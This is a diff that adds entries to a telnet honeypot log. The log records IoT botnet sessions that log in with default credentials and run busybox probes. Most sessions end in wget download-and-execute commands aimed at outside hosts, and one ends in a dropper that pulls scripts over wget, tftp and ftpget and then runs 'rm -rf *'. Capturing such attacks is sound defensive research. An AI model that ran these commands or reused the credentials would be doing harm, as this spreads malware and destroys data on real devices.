@@ -465,3 +465,93 @@
 2017-02-25 20:35:21,164 - __main__ - INFO - 104.7.14.91:33108 logged in as root-toor
 2017-02-25 20:35:22,551 - __main__ - INFO - 104.7.14.91:33108: 'rm .s; wget http://161.18.225.244:38153/.i; chmod +x .i; ./.i; exit'
 2017-02-25 20:35:24,150 - __main__ - INFO - Lost connection to 104.7.14.91:33108
+2017-02-25 20:36:46,607 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:36:55,779 - __main__ - INFO - Opened connection to 42.115.8.54:49798
+2017-02-25 20:36:56,925 - __main__ - INFO - 42.115.8.54:49798 logged in as root-anko
+2017-02-25 20:36:57,145 - __main__ - INFO - 42.115.8.54:49798: 'enable'
+2017-02-25 20:36:57,211 - __main__ - INFO - 42.115.8.54:49798: 'shell'
+2017-02-25 20:36:57,211 - __main__ - INFO - 42.115.8.54:49798: 'sh'
+2017-02-25 20:36:57,433 - __main__ - INFO - 42.115.8.54:49798: 'cat /proc/mounts; /bin/busybox KGSYG'
+2017-02-25 20:36:57,905 - __main__ - INFO - 42.115.8.54:49798: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox KGSYG'
+2017-02-25 20:36:58,388 - __main__ - INFO - 42.115.8.54:49798: 'nc; wget; /bin/busybox KGSYG'
+2017-02-25 20:36:58,729 - __main__ - INFO - 42.115.8.54:49798: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 20:36:58,945 - __main__ - INFO - 42.115.8.54:49798: '/bin/busybox KGSYG'
+2017-02-25 20:36:59,198 - __main__ - INFO - 42.115.8.54:49798: 'rm .s; wget http://42.115.8.54:58727/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:37:00,615 - __main__ - INFO - Lost connection to 42.115.8.54:49798
+2017-02-25 20:42:57,434 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:47:33,337 - __main__ - INFO - Opened connection to 114.35.157.111:43535
+2017-02-25 20:48:04,074 - __main__ - INFO - Lost connection to 114.35.157.111:43535
+2017-02-25 20:53:04,658 - __main__ - INFO - Opened connection to 121.158.41.26:3764
+2017-02-25 20:53:05,461 - __main__ - INFO - 121.158.41.26:3764 logged in as admin-admin
+2017-02-25 20:53:05,604 - __main__ - INFO - Lost connection to 121.158.41.26:3764
+2017-02-25 20:55:10,689 - __main__ - INFO - Opened connection to 78.187.214.246:49855
+2017-02-25 20:55:11,763 - __main__ - INFO - 78.187.214.246:49855 logged in as admin-12345
+2017-02-25 20:55:11,997 - __main__ - INFO - 78.187.214.246:49855: 'enable'
+2017-02-25 20:55:12,061 - __main__ - INFO - 78.187.214.246:49855: 'shell'
+2017-02-25 20:55:12,061 - __main__ - INFO - 78.187.214.246:49855: 'sh'
+2017-02-25 20:55:12,318 - __main__ - INFO - 78.187.214.246:49855: 'cat /proc/mounts; /bin/busybox OUWWY'
+2017-02-25 20:55:12,826 - __main__ - INFO - 78.187.214.246:49855: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox OUWWY'
+2017-02-25 20:55:13,323 - __main__ - INFO - 78.187.214.246:49855: 'nc; wget; /bin/busybox OUWWY'
+2017-02-25 20:55:13,669 - __main__ - INFO - 78.187.214.246:49855: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 20:55:13,902 - __main__ - INFO - 78.187.214.246:49855: '/bin/busybox OUWWY'
+2017-02-25 20:55:14,212 - __main__ - INFO - 78.187.214.246:49855: 'rm .s; wget http://187.19.232.116:52275/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:55:15,275 - __main__ - INFO - Lost connection to 78.187.214.246:49855
+2017-02-25 20:55:48,959 - __main__ - INFO - Opened connection to 59.127.152.7:57844
+2017-02-25 20:55:49,287 - __main__ - INFO - Opened connection to 81.170.201.53:56532
+2017-02-25 20:55:49,567 - __main__ - INFO - Opened connection to 81.170.201.53:56536
+2017-02-25 20:55:49,830 - __main__ - INFO - Opened connection to 81.170.201.53:56537
+2017-02-25 20:55:52,759 - __main__ - INFO - 81.170.201.53:56532 logged in as admin-7ujMko0admin
+2017-02-25 20:55:53,362 - __main__ - INFO - 81.170.201.53:56537 logged in as ubnt-ubnt
+2017-02-25 20:55:53,414 - __main__ - INFO - 81.170.201.53:56536 logged in as admin-1111111
+2017-02-25 20:55:54,659 - __main__ - INFO - 81.170.201.53:56537: 'enable'
+2017-02-25 20:55:54,722 - __main__ - INFO - 81.170.201.53:56537: 'shell'
+2017-02-25 20:55:54,722 - __main__ - INFO - 81.170.201.53:56537: 'sh'
+2017-02-25 20:55:54,780 - __main__ - INFO - 81.170.201.53:56536: 'enable'
+2017-02-25 20:55:54,839 - __main__ - INFO - 81.170.201.53:56536: 'shell'
+2017-02-25 20:55:54,839 - __main__ - INFO - 81.170.201.53:56536: 'sh'
+2017-02-25 20:55:56,345 - __main__ - INFO - Opened connection to 81.170.201.53:56541
+2017-02-25 20:55:56,762 - __main__ - INFO - 81.170.201.53:56536: 'cat /proc/mounts; /bin/busybox JLEHV'
+2017-02-25 20:55:56,886 - __main__ - INFO - 81.170.201.53:56537: 'cat /proc/mounts; /bin/busybox FHOCN'
+2017-02-25 20:55:58,101 - __main__ - INFO - 81.170.201.53:56532: 'enable'
+2017-02-25 20:55:58,159 - __main__ - INFO - 81.170.201.53:56532: 'shell'
+2017-02-25 20:55:58,159 - __main__ - INFO - 81.170.201.53:56532: 'sh'
+2017-02-25 20:55:59,363 - __main__ - INFO - 81.170.201.53:56537: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox FHOCN'
+2017-02-25 20:55:59,650 - __main__ - INFO - 81.170.201.53:56541 logged in as root-juantech
+2017-02-25 20:56:00,456 - __main__ - INFO - 81.170.201.53:56536: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox JLEHV'
+2017-02-25 20:56:00,754 - __main__ - INFO - 81.170.201.53:56541: 'enable'
+2017-02-25 20:56:00,815 - __main__ - INFO - 81.170.201.53:56537: 'nc; wget; /bin/busybox FHOCN'
+2017-02-25 20:56:00,957 - __main__ - INFO - 81.170.201.53:56541: 'shell'
+2017-02-25 20:56:00,957 - __main__ - INFO - 81.170.201.53:56541: 'sh'
+2017-02-25 20:56:02,321 - __main__ - INFO - 81.170.201.53:56536: 'nc; wget; /bin/busybox JLEHV'
+2017-02-25 20:56:02,454 - __main__ - INFO - 81.170.201.53:56541: 'cat /proc/mounts; /bin/busybox UUYEL'
+2017-02-25 20:56:02,600 - __main__ - INFO - 81.170.201.53:56537: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 20:56:03,038 - __main__ - INFO - 81.170.201.53:56532: 'cat /proc/mounts; /bin/busybox LUDUS'
+2017-02-25 20:56:03,860 - __main__ - INFO - 81.170.201.53:56537: '/bin/busybox FHOCN'
+2017-02-25 20:56:04,386 - __main__ - INFO - 81.170.201.53:56536: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 20:56:05,687 - __main__ - INFO - 81.170.201.53:56536: '/bin/busybox JLEHV'
+2017-02-25 20:56:07,478 - __main__ - INFO - 81.170.201.53:56532: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox LUDUS'
+2017-02-25 20:56:07,812 - __main__ - INFO - 81.170.201.53:56537: 'rm .s; wget http://59.88.91.26:2170/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:56:10,339 - __main__ - INFO - Lost connection to 81.170.201.53:56537
+2017-02-25 20:56:10,646 - __main__ - INFO - 81.170.201.53:56536: 'rm .s; wget http://117.98.174.119:0/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:56:11,241 - __main__ - INFO - 81.170.201.53:56541: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox UUYEL'
+2017-02-25 20:56:11,492 - __main__ - INFO - Lost connection to 81.170.201.53:56536
+2017-02-25 20:56:12,127 - __main__ - INFO - 81.170.201.53:56532: 'nc; wget; /bin/busybox LUDUS'
+2017-02-25 20:56:13,206 - __main__ - INFO - 81.170.201.53:56541: 'nc; wget; /bin/busybox UUYEL'
+2017-02-25 20:56:13,784 - __main__ - INFO - 81.170.201.53:56532: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 20:56:14,708 - __main__ - INFO - 81.170.201.53:56541: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 20:56:15,265 - __main__ - INFO - 81.170.201.53:56532: '/bin/busybox LUDUS'
+2017-02-25 20:56:16,216 - __main__ - INFO - 81.170.201.53:56541: '/bin/busybox UUYEL'
+2017-02-25 20:56:16,763 - __main__ - INFO - 81.170.201.53:56532: 'rm .s; wget http://<invalid address>/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:56:17,046 - __main__ - INFO - Lost connection to 81.170.201.53:56532
+2017-02-25 20:56:20,772 - __main__ - INFO - Lost connection to 59.127.152.7:57844
+2017-02-25 20:56:22,006 - __main__ - INFO - 81.170.201.53:56541: 'rm .s; wget http://<invalid address>/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:56:22,284 - __main__ - INFO - Lost connection to 81.170.201.53:56541
+2017-02-25 20:57:14,856 - __main__ - INFO - Opened connection to 115.135.20.245:60344
+2017-02-25 20:57:45,664 - __main__ - INFO - Lost connection to 115.135.20.245:60344
+2017-02-25 20:57:54,423 - __main__ - INFO - Opened connection to 217.107.125.183:8922
+2017-02-25 20:58:14,339 - __main__ - INFO - 217.107.125.183:8922 logged in as root-root
+2017-02-25 20:58:17,716 - __main__ - INFO - Opened connection to 156.216.193.93:55418
+2017-02-25 20:58:25,696 - __main__ - INFO - 217.107.125.183:8922: 'sh'
+2017-02-25 20:58:28,346 - __main__ - INFO - 217.107.125.183:8922: 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.237.120/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.34.237.120 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.34.237.120; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.34.237.120 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit'
+2017-02-25 21:07:23,238 - __main__ - INFO - Saving file /bins.sh with md5sum 51d46fceb2b731da94ff00456e45f137 from 217.107.125.183:8922
+2017-02-25 21:07:59,113 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
